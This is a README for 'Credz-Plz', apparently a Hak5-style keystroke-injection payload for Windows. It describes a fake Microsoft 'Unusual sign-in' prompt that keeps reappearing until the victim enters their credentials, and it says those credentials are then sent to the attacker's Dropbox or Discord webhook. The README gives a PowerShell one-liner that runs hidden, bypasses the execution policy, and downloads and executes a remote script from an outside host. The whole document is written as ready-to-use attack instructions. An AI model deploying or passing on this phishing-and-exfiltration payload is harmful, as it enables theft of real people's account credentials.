![Logo](https://github.com/I-Am-Jakoby/hak5-submissions/blob/main/Assets/logo-170-px.png?raw=true)

<!-- TABLE OF CONTENTS -->
<details>
  <summary>Table of Contents</summary>
  <ol>
    <li><a href="#Description">Description</a></li>
    <li><a href="#getting-started">Getting Started</a></li>
    <li><a href="#Contributing">Contributing</a></li>
    <li><a href="#Version-History">Version History</a></li>
    <li><a href="#Contact">Contact</a></li>
    <li><a href="#Acknowledgments">Acknowledgments</a></li>
  </ol>
</details>

# Credz-Plz

A script used to prompt the target to enter their creds to later be exfiltrated with either Dropbox or a Discord webhook.

## Description

A pop up box will let the target know "Unusual sign-in. Please authenticate your Microsoft Account".
This will be followed by a fake authentication ui prompt. 
If the target tried to "X" out, hit "CANCEL" or while the password box is empty hit "OK" the prompt will continuously re pop up.
Once the target enters their credentials their information will be uploaded to your Dropbox or Discord webhook for collection.


## Getting Started

### Dependencies

* DropBox or other file sharing service - Your Shared link for the intended file
* Windows 10,11


### Executing program

* Plug in your device
* Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory
* You no longer need to host your own version of this script 
* `$db` is the variable that holds your DropBox token
* `$dc` is the variable that holds your Discord webhook 
* Fill in either variable or both to set your exfil method

```
powershell -w h -ep bypass $dc='';$db='';irm https://jakoby.lol/35k | iex
```

<p align="right">(<a href="#top">back to top</a>)</p>

## Contributing


## Version History

* 0.1
    * Initial Release

<p align="right">(<a href="#top">back to top</a>)</p>

<!-- CONTACT -->
## Contact


<!-- ACKNOWLEDGMENTS -->
## Acknowledgments

* [Hak5](https://hak5.org/)
* [MG](https://github.com/OMG-MG)

<p align="right">(<a href="#top">back to top</a>)</p>
